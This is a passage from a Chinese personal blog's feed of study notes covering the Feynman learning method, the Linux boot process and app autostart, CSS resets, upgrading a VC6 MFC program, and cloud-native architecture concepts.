<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.snowbeasts.com/blog/details/592" target="_blank" rel="noopener">2024年20个最好的AI工具和应用</a>,by snowbeasts.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/ChatGPT" target="_blank" rel="noopener">ChatGPT</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/Stable_Diffusion" target="_blank" rel="noopener">Stable Diffusion</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/DALL-E" target="_blank" rel="noopener">DALL-E</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>费曼学习法学习笔记</title>
    <url>/2024/12/19/%E8%B4%B9%E6%9B%BC%E5%AD%A6%E4%B9%A0%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>费曼学习法是由著名物理学家、诺贝尔物理学奖得主理 查德·费曼提出的。其核心就是： 通过简短的语言，向别人清楚地解说一件事，来检验自己是否真的弄懂了这件事。</p>
<p>费曼学习法通过“ 以教促学”的方式让人在短时间内掌握知识，并且快速吸收信息。</p>
<p>费曼学习法可以简化为四个单词： concept（概念）、Teach（教给别人）、Review（评价）、Simplify（简化）。具体操作可概括四个步骤：</p>
<h1 id="第一步：选择目标"><a href="#第一步：选择目标" class="headerlink" title="第一步：选择目标"></a>第一步：选择目标</h1><blockquote>
<p>选择目标的选择很简单，就是确定你要学什么，或要干什么。在这里比如学习一门技术、学习一个科学领域、学习一门语言、学习一个概念等，都可以称作目标。</p>
</blockquote>
<blockquote>
<p>但如果想制定非常棒的目标，还可以学习一下 SMART 原则：Specific 具体、Measurable 可测量、Attainable 可实现、Relevant 相关性、Time—based 时效性。也就是说计划要具体、可测量、坚持即可实现、对你有意义并且要在一定的期限内完成。</p>
</blockquote>
<h1 id="第二步：教学"><a href="#第二步：教学" class="headerlink" title="第二步：教学"></a>第二步：教学</h1><blockquote>
<p>创造一个场景，在这个场景中将自己学到的知识讲授给 “别人”。在这个过程中会遇到很多问题，比如说不清楚，讲不明白，自己也模棱两可等，那就说明这些知识点并没有熟练掌握。尝试教授和发现薄弱点就是这一步的重点。</p>
</blockquote>
<h1 id="第三步：纠错学习"><a href="#第三步：纠错学习" class="headerlink" title="第三步：纠错学习"></a>第三步：纠错学习</h1><blockquote>
<p>在第二步中遇到了问题，那么就需要进入第三步 —— 纠错学习。无论是在教授的过程中说错的、说不清楚的、模棱两可的都需要在这一步中进行强化。反复查询资料、学习、强化记忆，然后再重复第二步进行验证，直到可以顺利的教授相应的知识。</p>
</blockquote>
<h1 id="第四步：简化"><a href="#第四步：简化" class="headerlink" title="第四步：简化"></a>第四步：简化</h1><blockquote>
<p>这一步是对上面学习的内容进行提炼、简化，去掉非必要的，多余的信息，并且能够用自己的语言通俗易懂的表达出来，而不是照本宣科。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.sohu.com/a/583465343_800763" target="_blank" rel="noopener">顶级认知的40大模型 | 第2期：费曼学习法 </a>,by 思铺学院.</li>
<li><a href="https://learnku.com/articles/35137" target="_blank" rel="noopener">世界上最好的学习法：费曼学习法</a>,by CrazyZard.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>教学</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开机自启动方法</title>
    <url>/2024/12/19/Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在使用 Linux 系统的过程中，默认有一个即时通讯软件开机自启动，想将该应用禁掉，不让其自启动。在 Linux 系统中，设置一个应用自启动的地方很多，遍布整个 Linux 启动流程。因此，首先了解 Linux 启动流程，再说明设置或禁用应用自启动的方法。</p>
<h1 id="Linux-开机启动流程"><a href="#Linux-开机启动流程" class="headerlink" title="Linux 开机启动流程"></a>Linux 开机启动流程</h1><p>Linux 开机启动流程如下：</p>
<ul>
<li>第一阶段：硬件引导启动阶段</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.1 POST(Power On Self Test) 加电自检</span><br><span class="line">1.2 BIOS</span><br><span class="line">	1.2.1 初始化硬件</span><br><span class="line">	1.2.2 查找启动介质</span><br><span class="line">		HDD: 查找启动硬盘的第一个扇区（MBR&#x2F;BootSector）</span><br><span class="line">1.3 MBR</span><br><span class="line">	1.3.1 Bootloader（启动装载程序）</span><br><span class="line">		GRUB</span><br><span class="line">		分区表</span><br></pre></td></tr></table></figure>

<ul>
<li>第二阶段：BootLoader 启动引导阶段</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2.1 Stage1</span><br><span class="line">	执行 BootLoader 主程序(位于 MBR 前 446个字节)，它的作用是启动 Stage1.5 或 Stage2</span><br><span class="line">2.2 Stage1.5</span><br><span class="line">	Stage1.5 是桥梁，由于 Stage2 较大，存放在文件系统中，需要 Stage1.5 引导位于文件系统中的 Stage2</span><br><span class="line">2.3 Stage2</span><br><span class="line">	Stage2 是 GRUB 的核心映像</span><br><span class="line">2.4 grub.conf</span><br><span class="line">	Stage2 解析 grub.conf 配置文件，加载内核到内存中</span><br></pre></td></tr></table></figure>

<ul>
<li>第三阶段：内核引导阶段</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3.1 &#x2F;boot&#x2F;kernel and Kernel parameter </span><br><span class="line">	内核初始化，加载基本的硬件驱动</span><br><span class="line">	</span><br><span class="line">3.2 &#x2F;boot&#x2F;initrd</span><br><span class="line">	引导 initrd 解压载入</span><br><span class="line">	3.2.1 阶段一：在内存中释放供 kernel 使用的 root filesystem</span><br><span class="line">				执行 initrd 文件系统中的 init，完成加载其他驱动模块</span><br><span class="line">	3.2.2 阶段二：执行真正的根文件系统中的 &#x2F;sbin&#x2F;init 进程</span><br></pre></td></tr></table></figure>

<ul>
<li>第四阶段：Sys V init 初始化阶段</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4.1 &#x2F;sbin&#x2F;init</span><br><span class="line">	4.1.1 &#x2F;etc&#x2F;inittab</span><br><span class="line">		init 进程读取 &#x2F;etc&#x2F;inittab 文件，确定系统启动的运行级别</span><br><span class="line">	4.1.2 &#x2F;etc&#x2F;rc.d&#x2F;rc.sysinit</span><br><span class="line">		执行系统初始化脚本，对系统进行基本的配置</span><br><span class="line">	4.1.3 &#x2F;etc&#x2F;rc.d&#x2F;rcN.d</span><br><span class="line">		根据先前确定的运行级别启动对应运行级别中的服务</span><br><span class="line">	4.1.4 &#x2F;etc&#x2F;rc.d&#x2F;rc.local</span><br><span class="line">		执行用户自定义的开机启动程序</span><br><span class="line">4.2 登录</span><br><span class="line">	4.2.1 &#x2F;sbin&#x2F;mingetty (命令行登录)</span><br><span class="line">		验证通过 执行 &#x2F;etc&#x2F;login </span><br><span class="line">		加载 &#x2F;etc&#x2F;profile  ~&#x2F;.bash_profile  ~&#x2F;.bash_login  ~&#x2F;.profile</span><br><span class="line">		取得 non-login Shell</span><br><span class="line">		</span><br><span class="line">	4.2.2 &#x2F;etc&#x2F;X11&#x2F;prefdm (图形界面登录)</span><br><span class="line">		gdm kdm xdm</span><br><span class="line">		Xinit</span><br><span class="line">		加载 ~&#x2F;.xinitrc  ~&#x2F;.xserverrc</span><br></pre></td></tr></table></figure>

<ul>
<li>第五阶段：启动完成</li>
</ul>
<h1 id="设置应用自启动方法"><a href="#设置应用自启动方法" class="headerlink" title="设置应用自启动方法"></a>设置应用自启动方法</h1><p>从 Linux 开机流程可知，设置应用自启动主要在 Linux 启动流程的第四阶段。如果是服务或其他非 GUI 应用，可在 4.1 阶段设置开机自启动。如果是 GUI 应用，应在 4.2 阶段设置开机自启动。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://jaminzhang.github.io/linux/Linux-boot-process/" target="_blank" rel="noopener">Linux 系统启动流程</a>,by jaminzhang.</li>
<li><a href="https://blog.csdn.net/weixin_54015549/article/details/131457432" target="_blank" rel="noopener">Linux开机启动流程(超详细版)</a>,by Code_xw.</li>
<li><a href="https://zh.wikipedia.org/wiki/Initrd" target="_blank" rel="noopener">initrd</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/gengzhikui1992/article/details/85624879" target="_blank" rel="noopener">linux启动流程——initrd和initramfs</a>,by 网络安全研发随想.</li>
<li><a href="https://xdaforums.com/t/info-boot-process-android-vs-linux.3785254/" target="_blank" rel="noopener">[INFO] BOOT PROCESS: ANDROID vs. LINUX</a>,by mirfatif.</li>
<li><a href="https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">Systemd 入门教程：命令篇</a>,by 阮一峰.</li>
<li><a href="https://www.ruanyifeng.com/blog/2016/03/node-systemd-tutorial.html" target="_blank" rel="noopener">Node 应用的 Systemd 启动</a>,by 阮一峰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>现代CSS重置方法</title>
    <url>/2024/12/22/%E7%8E%B0%E4%BB%A3CSS%E9%87%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>层叠样式表（Cascading Style Sheets，缩写为 CSS）是一种样式表语言，用来描述 HTML 或 XML（包括如 SVG、MathML 或 XHTML 之类的 XML 分支语言）文档的呈现方式。CSS 描述了在屏幕、纸质、音频等其他媒体上的元素应该如何被渲染的问题。</p>
</blockquote>
<p>通常在开始一个新的项目之前，应对CSS进行重置，建立一个基线，以便使网页在不同浏览器上有一致的显示。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.joshwcomeau.com/css/custom-css-reset/" target="_blank" rel="noopener">A Modern CSS Reset</a>,by joshwcomeau.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS" target="_blank" rel="noopener">CSS：层叠样式表</a>,by mozilla.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机科学中的关键术语解释</title>
    <url>/2024/12/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E6%9C%AF%E8%AF%AD%E8%A7%A3%E9%87%8A/</url>
    <content><![CDATA[<p>记录计算机科学中一些关键术语的解释，方便以后教学。</p>
<h1 id="顺序、并发和并行执行"><a href="#顺序、并发和并行执行" class="headerlink" title="顺序、并发和并行执行"></a>顺序、并发和并行执行</h1><p>请参考<a href="https://www.rugu.dev/en/blog/concurrency-and-parallelism/" target="_blank" rel="noopener">Understanding Concurrency, Parallelism and JS</a></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.rugu.dev/en/blog/concurrency-and-parallelism/" target="_blank" rel="noopener">Understanding Concurrency, Parallelism and JS</a>,by Uğur Erdem Seyfi.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>教学</tag>
      </tags>
  </entry>
  <entry>
    <title>VC6之MFC遗留程序升级方法</title>
    <url>/2024/12/24/VC6%E4%B9%8BMFC%E9%81%97%E7%95%99%E7%A8%8B%E5%BA%8F%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近拿到一个VC6 MFC编写的遗留程序源代码，需要将其升级到最新的Windows系统，记录一下升级过程。</p>
<h1 id="MFC程序执行流程"><a href="#MFC程序执行流程" class="headerlink" title="MFC程序执行流程"></a>MFC程序执行流程</h1><blockquote>
<p>程序是从Main（WinMain）开始和结束。 但是在Main（WinMain）开始之前会对全局的变量或者对象进行初始化。</p>
</blockquote>
<blockquote>
<p>故在MFC中，通过全局类（theApp） 的初始化， 进入theApp的构造函数，根据类的规则，初始子类的构造函数，必须先要运行父类的构造函数。 在这过程把包含WinMain的文件连接了进来。 这样就隐藏了WinMain函数。 </p>
</blockquote>
<blockquote>
<p>在WinMain函数中调用了AfxWinMain函数，在AfxWinMain函数中通过调用InitInstance函数完成了窗口的设计 窗口的注册 窗口的创建 窗口的显示和更新。然后在AfxWinMain中调用了Run方法，完成消息循环。</p>
</blockquote>
<h1 id="MFC扩展库BCGControlBar"><a href="#MFC扩展库BCGControlBar" class="headerlink" title="MFC扩展库BCGControlBar"></a>MFC扩展库BCGControlBar</h1><p>遗留程序依赖 MFC 扩展库BCGControlBar，因此需要安装和配置 BCGControlBar，否则编译链接出错。例如：</p>
<p>BCGCBProInc.h : No such s file or dictionary. 解决方案：安装BGB界面库</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>BCGControlBar是一个基于MFC的扩展库，您可以通过完全的用户化操作构成一些类似于Microsoft Office 2000/XP/2003和Microsoft Visual Studio.NET的应用程序（用户工具栏、菜单、键盘等等）。BCGControlBar库包含了大约150多个经过精心设计，测试和具有完备文档的MFC扩展类。这些都可以很容易的应用于您的应用程序，节省大量的开发和调试时间。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在编译之前，要先设置其附加包含目录和附加库目录。</p>
<p>vc6.0在其tools&gt;&gt;options&gt;&gt;directoris下进行设置。在show directories for选择include files，添加BCGControlBar安装目录下的BCGCBPro目录。</p>
<p>然后再选择show directories for下的Library files并添加BCGControlBar安装目录下的bin目录。</p>
<h1 id="MFC扩展库MapX"><a href="#MFC扩展库MapX" class="headerlink" title="MFC扩展库MapX"></a>MFC扩展库MapX</h1><p>遗留程序依赖 MFC 扩展库 MapX，因此需要安装和配置 MapX，否则编运行出错。</p>
<h2 id="MapX简介"><a href="#MapX简介" class="headerlink" title="MapX简介"></a>MapX简介</h2><p>MapX控件是Map Info公司向用户提供的具有强大地图分析功能的ActiveX控件，适用于大多数面向对象语言，可以无缝嵌入到各个领域的应用系统当中去。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/wenluderen/p/4952544.html" target="_blank" rel="noopener">深入跟踪MFC程序的执行流程</a>,by wenluderen</li>
<li><a href="https://www.cnblogs.com/Mars-0603/p/14922947.html" target="_blank" rel="noopener">【C++】MFC 程序入口和执行流程</a>,by 不溯流光.</li>
<li><a href="https://blog.csdn.net/qq_42444778/article/details/119109843" target="_blank" rel="noopener">MFC专业扩展库BCGControlBar：使用方法入门</a>,by 不如温暖过生活.</li>
<li><a href="https://www.cnblogs.com/vipwtl/p/6146333.html" target="_blank" rel="noopener">MFC BCGControlBar 安装及使用</a>,by VIPWTL.</li>
<li><a href="https://www.cnblogs.com/hao-hong-sheng/p/8513280.html" target="_blank" rel="noopener">MFC框架——单文档/多文档/对话框/多顶级文档的区别</a>,by 郝红升.</li>
<li><a href="https://blog.csdn.net/daizhiyan1/article/details/82769878" target="_blank" rel="noopener">MFC建立空文档失败分析</a>,by 咖啡熊猫.</li>
<li><a href="https://blog.csdn.net/elcarim/article/details/6773812" target="_blank" rel="noopener">关于VC++6.0重新安装falsed时出现的DCOM user account解决方案</a>,by miracle_dan.</li>
<li><a href="https://www.cnblogs.com/junlei/p/3635756.html" target="_blank" rel="noopener">VC下MapX开发环境建立</a>,by 风一兮.</li>
<li><a href="https://www.cnblogs.com/junlei/p/3635807.html" target="_blank" rel="noopener">用VC++对MapX进行二次开发总结</a>,by 风一兮.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>深入高可用系统原理与设计读书笔记</title>
    <url>/2024/12/25/%E6%B7%B1%E5%85%A5%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E8%AE%BE%E8%AE%A1%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="第一章：云原生技术概论"><a href="#第一章：云原生技术概论" class="headerlink" title="第一章：云原生技术概论"></a>第一章：云原生技术概论</h1><h2 id="云计算的演进变革"><a href="#云计算的演进变革" class="headerlink" title="云计算的演进变革"></a>云计算的演进变革</h2><h2 id="物理机时代"><a href="#物理机时代" class="headerlink" title="物理机时代"></a>物理机时代</h2><h3 id="虚拟化技术成熟"><a href="#虚拟化技术成熟" class="headerlink" title="虚拟化技术成熟"></a>虚拟化技术成熟</h3><blockquote>
<p>从虚拟化技术的发展中，我们看到业务的工作负载由物理机转向虚拟机，资源有了初级的隔离，并且分配/利用更加合理。</p>
</blockquote>
<h3 id="云计算技术成熟"><a href="#云计算技术成熟" class="headerlink" title="云计算技术成熟"></a>云计算技术成熟</h3><blockquote>
<p>对于 XaaS 的一路演进，可以简单归纳为：</p>
</blockquote>
<ul>
<li>有了 IaaS（Infrastructure as a Service，基础设施即服务），客户不用关注物理机器，只需关注基础架构及应用程序。</li>
<li>有了 PaaS（Platform as a Service，平台即服务），客户不用关注基础架构，只需关注应用程序。</li>
<li>有了 FaaS（Function as a Service，功能即服务），客户只需关注功能和数据。</li>
</ul>
<h3 id="容器技术的兴起"><a href="#容器技术的兴起" class="headerlink" title="容器技术的兴起"></a>容器技术的兴起</h3><blockquote>
<p>Docker 创新性地提出了“镜像”（image）的概念，实现了一种新型的应用打包、分发和运行机制，开发人员能够在几秒钟内完成应用程序的部署、运行，无需再担心环境不一致的问题。</p>
</blockquote>
<h2 id="云原生出现的背景"><a href="#云原生出现的背景" class="headerlink" title="云原生出现的背景"></a>云原生出现的背景</h2><blockquote>
<p>部分软件已经变成水电煤一样的社会经济中的基础设施。</p>
</blockquote>
<blockquote>
<p>过去二十年间，云的底层基础设施和平台越来越强大，软件架构的发展也逐渐和云匹配：</p>
</blockquote>
<ul>
<li>通过不可变基础设施（镜像）解决本地和远程一致性问题；</li>
<li>通过服务网格（ServiceMesh）将非业务逻辑从应用程序中剥离；</li>
<li>通过声明式 API 描述应用程序的状态，而不用管中间的处理过程；</li>
<li>通过 DevOps 方法论以及一系列工具来提升研发/运维效率…</li>
</ul>
<blockquote>
<p>应用程序中的非业务逻辑不断被剥离，并下沉到云/基础设施层，代码越来越轻量。由此，工程师的开发工作回归本质（软件开发的本质是解决业务需求，各类“高深”、“复杂”的技术难题是业务需求的副产物，并不是软件开发的主题）。</p>
</blockquote>
<h2 id="云原生的定义"><a href="#云原生的定义" class="headerlink" title="云原生的定义"></a>云原生的定义</h2><blockquote>
<p>CNCF 云原生的定义 v1.0 版本</p>
</blockquote>
<blockquote>
<p>云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API。</p>
</blockquote>
<blockquote>
<p>这些技术能够构建容错性好、易于管理和便于观察的松耦合系统。结合可靠的自动化手段，云原生技术使工程师能够轻松地对系统作出频繁和可预测的重大变更。</p>
</blockquote>
<h2 id="云原生的目标"><a href="#云原生的目标" class="headerlink" title="云原生的目标"></a>云原生的目标</h2><blockquote>
<p>云原生的几个关键目标:</p>
</blockquote>
<ul>
<li>可用（Available）：通过各种机制来实现应用的高可用，以保证服务提供的连续性。</li>
<li>规模（Scale）：要求云原生服务能够适应不同的规模（包括但不限于用户规模/部署规模/请求量），并能够在部署时动态分配资源，以便在不同的规模之间快速和平滑的伸缩。</li>
<li>敏捷（Agility）：快速响应市场需求。</li>
<li>成本（Cost）：充分有效的利用资源。</li>
</ul>
<h2 id="云原生代表技术"><a href="#云原生代表技术" class="headerlink" title="云原生代表技术"></a>云原生代表技术</h2><blockquote>
<p>云原生的代表技术：容器技术、微服务、服务网格、不可变基础设施、声明式设计以及 DevOps。</p>
</blockquote>
<h3 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a>容器技术</h3><blockquote>
<p>Google Cloud 对容器的定义: 容器是轻量级应用代码包，它还包含依赖项，例如编程语言运行时的特定版本和运行软件服务所需的库。</p>
</blockquote>
<p>容器技术发展历程：</p>
<h4 id="chroot-阶段：隔离文件系统"><a href="#chroot-阶段：隔离文件系统" class="headerlink" title="chroot 阶段：隔离文件系统"></a>chroot 阶段：隔离文件系统</h4><p>chroot 被认为是最早的容器技术之一，它能将进程的根目录重定向到某个新目录，复现某些特定环境，同时也将进程的文件读写权限限制在该目录内。</p>
<h4 id="LXC-阶段：封装系统"><a href="#LXC-阶段：封装系统" class="headerlink" title="LXC 阶段：封装系统"></a>LXC 阶段：封装系统</h4><p>至 2013 年，Linux 虚拟化技术已基本成型，通过 cgroups、namespace 以及安全防护机制，大体上解决了容器核心技术“运行环境隔离”，但此时仍需等待另一项关键技术的出现，才能迎来容器技术的全面繁荣。</p>
<h4 id="Docker-阶段：封装应用"><a href="#Docker-阶段：封装应用" class="headerlink" title="Docker 阶段：封装应用"></a>Docker 阶段：封装应用</h4><p>Docker 的核心创新“容器镜像（container image）”：</p>
<ul>
<li>容器镜像打包了整个容器运行依赖的环境，以避免依赖运行容器的服务器的操作系统，从而实现“build once，run anywhere”。</li>
<li>容器镜像一但构建完成，就变成只读状态，成为不可变基础设施的一份子。</li>
<li>与操作系统发行版无关，核心解决的是容器进程对操作系统包含的库、工具、配置的依赖（注意，容器镜像无法解决容器进程对内核特性的特殊依赖）。</li>
</ul>
<h4 id="OCI-阶段：容器标准化"><a href="#OCI-阶段：容器标准化" class="headerlink" title="OCI 阶段：容器标准化"></a>OCI 阶段：容器标准化</h4><blockquote>
<p>OCI 组织着力解决容器的构建、分发和运行标准问题，其宗旨是制定并维护 OCI Specifications（容器镜像格式和容器运行时的标准规范）。</p>
</blockquote>
<blockquote>
<p>OCI 有了三个主要的标准：</p>
</blockquote>
<ul>
<li>OCI Runtime Spec（容器运行时标准）：定义了运行一个容器，如何管理容器的状态和生命周期，如何使用操作系统的底层特性（namespace、cgroups、pivot_root 等）。</li>
<li>OCI Image Spec（容器镜像标准）：定义了镜像的格式，配置（包括应用程序的参数、依赖的元数据格式、环境信息等），简单来说就是对镜像文件格式的描述。</li>
<li>OCI Distribution Spec（镜像分发标准）：定义了镜像上传和下载的网络交互过程的规范。</li>
</ul>
<h4 id="容器编排阶段：封装集群"><a href="#容器编排阶段：封装集群" class="headerlink" title="容器编排阶段：封装集群"></a>容器编排阶段：封装集群</h4><blockquote>
<p>以 Kubernetes 为代表的容器编排框架，就是把大型软件系统运行所依赖的集群环境也进行了虚拟化，让集群得以实现跨数据中心的绿色部署，并能够根据实际情况自动扩缩。</p>
</blockquote>
<blockquote>
<p>就像用 docker run 可以启动单个程序一样，现在用 kubectl apply -f 就能部署和运行一个分布式集群应用，而无需关心是在私有云还是公有云或者具体哪家云厂商上。</p>
</blockquote>
<h4 id="云原生阶段：百花齐放"><a href="#云原生阶段：百花齐放" class="headerlink" title="云原生阶段：百花齐放"></a>云原生阶段：百花齐放</h4><h3 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h3><blockquote>
<p> Netflix 云架构师 Adrian Cockcroft定义：微服务架构是一种面向服务的架构，由松耦合的具有有限上下文的元素组成。</p>
</blockquote>
<blockquote>
<p>Adrian Cockcroft 的观点中有两个核心概念：</p>
</blockquote>
<ul>
<li>松耦合（Loosely Coupled）：意味着每个服务可以独立的更新，更新一个服务无需要求改变其他服务。</li>
<li>限界上下文（Bounded Contexts）：意味着每个服务要有明确的边界性，你可以只关注自身软件的发布，而无需考虑谁在依赖你的发布版本。微服务和它的消费者严格通过 API 进行交互，不共享数据结构、数据库等。基于契约的微服务规范要求服务接口是稳定的，而且向下兼容。</li>
</ul>
<blockquote>
<p>微服务架构中，有一些必须解决的问题，如负载均衡、伸缩扩容、传输通讯等等，这些问题可以说只要是分布式架构的系统就无法完全避免。</p>
</blockquote>
<blockquote>
<p>Kubernetes 在基础设施层面，解决分布式系统问题的方案：</p>
</blockquote>
<ul>
<li>Kubernetes 用 CoreDNS 替代 Spring Cloud 服务发现组件 Eureka。</li>
<li>Kubernetes 用 Service/Load Balancer 替代 Spring Cloud 中的负载均衡组件 Ribbon。</li>
<li>Kubernetes 用 ConfigMap 替代 Spring Cloud 的配置中心 Config。</li>
<li>Kubernetes 用 Ingress 代替 Spring Cloud 的网关组件 Zuul。</li>
</ul>
<blockquote>
<p>当虚拟化的基础设施从单个服务的容器扩展至由多个容器构成的服务集群，并开始解决分布式的问题。</p>
</blockquote>
<h3 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h3><blockquote>
<p>服务网格（Service Mesh）的概念最早由 Buoyant 公司的创始人 William Morgan 于 2016 年提出。</p>
</blockquote>
<blockquote>
<p>服务网格的定义</p>
<p>服务网格（ServiceMesh）是一个基础设施层，用于处理服务间通信。云原生应用有着复杂的服务拓扑，服务网格保证请求在这些拓扑中可靠地穿梭。在实际应用当中，服务网格通常是由一系列轻量级的网络代理组成的，它们与应用程序部署在一起，但对应用程序透明。</p>
<p>—— by William Morgan</p>
</blockquote>
<blockquote>
<p>业内绝大部分服务网格产品通常由“数据平面”和“控制平面”两部分组成:</p>
</blockquote>
<ul>
<li>数据平面（Data plane）：通常采用轻量级的网络代理（如 Envoy）作为 Sidecar，网络代理负责协调和控制服务之间的通信和流量处理，解决微服务之间服务熔断、负载均衡、安全通讯等问题。</li>
<li>控制平面（Control plane）：包含多个控制组件，它们负责配置和管理 Sidecar ，并提供服务发现（Discovery）、配置管理（Configuration）、安全控制（Certificates）等功能。</li>
</ul>
<h3 id="不可变基础设施"><a href="#不可变基础设施" class="headerlink" title="不可变基础设施"></a>不可变基础设施</h3><blockquote>
<p>可变的基础设施会导致以下问题：</p>
</blockquote>
<ul>
<li>重大故障时，难以快速重新构建服务：持续过多的手动操作并且缺乏记录，会导致很难由标准初始化的服务器来重新构建起等效的服务；</li>
<li>不一致风险：类似于程序变量因并发修改而带来的状态不一致风险。服务运行过程中，频繁的修改基础设施配置，同样会引入中间状态，导致出现无法预知的问题。</li>
</ul>
<blockquote>
<p>不可变基础设施思想的核心是，任何基础设施的运行实例一旦创建之后就变成只读状态。如需修改或升级，应该先修改基础设施的配置模版（例如 yaml、Dockerfile 配置），之后再使用新的运行实例替换。</p>
</blockquote>
<h3 id="声明式设计"><a href="#声明式设计" class="headerlink" title="声明式设计"></a>声明式设计</h3><blockquote>
<p>声明式设计是指一种软件设计理念：“我们描述一个事物的目标状态，而非达成目标状态的流程”。至于目标状态如何达成，则由相应的工具在其内部实现。</p>
</blockquote>
<blockquote>
<p>和声明式设计相对的是命令式设计（又叫过程式设计），两者的区别是：</p>
</blockquote>
<ul>
<li>命令式设计：命令“机器”如何去做事情（how），这样不管你想要的是什么（what），它都会按照你的命令实现；</li>
<li>声明式设计：告诉“机器”你想要的是什么（what），让机器想出如何去做（how）。</li>
</ul>
<h3 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h3><blockquote>
<p>DevOps 是个很复杂的概念，几句话很难解释清楚。我们延用之前的惯例，如果要理解一个复杂的概念，就先去了解它出现的背景，以及发展的历史。</p>
</blockquote>
<blockquote>
<p>DevOps 核心本质是解决软件开发生命周期中的管理问题，我们先从一种名为“瀑布模型”的项目管理方法说起。</p>
</blockquote>
<blockquote>
<p>虽然敏捷开发提升了开发效率，但它的范围仅限于开发和测试环节，并没有覆盖到部署环节。显然，运维部门并没有收益。相反的，甚至可以说“敏捷”加重了运维的负担。运维追求的目标是稳定，频繁变更是破坏稳定的根源。</p>
</blockquote>
<blockquote>
<p>DevOps 运动始于 2007 年左右，当时技术社区对开发与运维之间分开工作的方式以及由此引发的冲突感到担忧。</p>
</blockquote>
<blockquote>
<p>DevOps 的定义</p>
<p>DevOps（Development 和 Operations 的合成词）是一种重视“软件开发人员（Dev）”和“IT 运维技术人员（Ops）”之间沟通合作的文化、运动或惯例。</p>
<p>通过自动化“软件交付”和“架构变更”的流程，来使得构建、测试、发布软件能够更加地快捷、频繁和可靠。</p>
<p>—— from 维基百科</p>
</blockquote>
<blockquote>
<p>DevOps 的成功实践离不开工具上的支持，这其中包括最重要的自动化 CI/CD 流水线，通过自动化的方式打通软件从构建、测试到部署发布的整个流程。还有实时监控、事件管理、配置管理、协作平台等一系列工具/系统的配合。</p>
</blockquote>
<h1 id="第二章-构建“足够快”的网络服务"><a href="#第二章-构建“足够快”的网络服务" class="headerlink" title="第二章: 构建“足够快”的网络服务"></a>第二章: 构建“足够快”的网络服务</h1><h2 id="HTTPS-请求优化分析"><a href="#HTTPS-请求优化分析" class="headerlink" title="HTTPS 请求优化分析"></a>HTTPS 请求优化分析</h2><p>一个完整、未复用连接的 HTTPS 请求需要经过以下 5 个阶段：DNS 域名解析、TCP 握手、SSL 握手、服务器处理、内容传输。</p>
<p>RTT（Round-Trip Time）一个网络数据包从起点到目的地然后再回到起点所花费的时长。</p>
<p>TTFB（Time To First Byte，首字节时间）指从浏览器请求页面到接收来自服务器发送的信息的第一个字节的时间。</p>
<h2 id="网络拥塞控制原理与实践"><a href="#网络拥塞控制原理与实践" class="headerlink" title="网络拥塞控制原理与实践"></a>网络拥塞控制原理与实践</h2><p>网络吞吐量与 RTT、带宽密切相关：</p>
<ul>
<li>RTT 越低，数据传输的延迟越低；</li>
<li>带宽越高，网络在单位时间内传输的数据越多。</li>
</ul>
<p>一些术语：</p>
<ul>
